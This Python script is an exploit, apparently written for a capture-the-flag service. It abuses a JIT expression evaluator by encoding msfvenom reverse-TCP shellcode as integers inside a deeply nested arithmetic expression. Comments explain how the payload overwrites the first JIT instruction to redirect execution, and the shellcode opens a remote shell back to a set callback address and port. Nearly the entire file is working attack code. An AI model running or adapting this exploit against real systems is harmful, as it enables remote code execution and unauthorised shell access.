#!/usr/bin/env python3

import sys
import asyncio
import subprocess

from os import path
from typing import List
import sys
import pathlib
import hashlib
import struct

sys.path.append(path.abspath("../checker/"))


TARGET_HOST: str = sys.argv[1]


def generate_expression(depth: int, numbers: List[int]) -> str:
    """Function that generates expressions in the form:
    `(0x4141414141414141 + (0x4141414141414141 + (0x4141414141414141 + ...)))`."""
    # Encoded `lea rdi, [rip + 0x3f8]`, will overwrite the first instruction in the
    # generated JIT-code, such that `rdi` points to the shellcode location
    # (JIT code start + 0x400), instead of the beginning of the evaluation stack.
    # Due to this, while reading the values from the expression, we'll write them to
    # the `JIT code start + 0x400`, and as soon as execution reaches this location,
    # we'll have the shellcode executed.
    expression = "(4364719442064)"

    delta = sum(numbers + [4364719442064])
    int64_max = 2**63 - 1

    for cur_depth in range(depth, -1, -1):
        if cur_depth < len(numbers):
            number = numbers[cur_depth]
            expression = f"({number} + {expression})"
        else:
            if delta >= int64_max:
                expression = f"({-int64_max} + {expression})"
                delta -= int64_max
            else:
                expression = f"({-delta} + {expression})"
                delta -= delta

    if delta != 0:
        raise ValueError("Couldn't satisfy the constraint that strategy yields 0")

    return expression


def generate_shellcode(host: str = "172.18.0.1", port: int = 1337) -> bytes:
    args = [
        "/opt/metasploit-framework/bin/msfvenom",
        f"LHOST={host}",
        f"LPORT={port}",
        "-p",
        "linux/x64/shell_reverse_tcp",
        "--arch",
        "x64",
        "--platform",
        "linux",
        "-f",
        "raw",
    ]
    shellcode_cache = f".sh-{hashlib.sha1(''.join(args).encode()).hexdigest()}"

    if pathlib.Path(shellcode_cache).exists():
        with open(shellcode_cache, "rb") as f:
            shellcode = f.read()
    else:
        shellcode = subprocess.check_output(args)
        with open(shellcode_cache, "wb") as f:
            f.write(shellcode)

    return shellcode


def generate_exploit():
    shellcode_numbers = []
    shellcode = (
        b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" + generate_shellcode()
    )
    for i in range(0, len(shellcode), 8):
        chunk = shellcode[i : i + 8].rjust(8, b"\x90")
        encoded_number = struct.unpack("<q", chunk)[0]
        shellcode_numbers.append(encoded_number)

    exploit = generate_expression(1535, shellcode_numbers)
    return exploit


async def main():
    print(generate_exploit())


if __name__ == "__main__":
    asyncio.run(main())
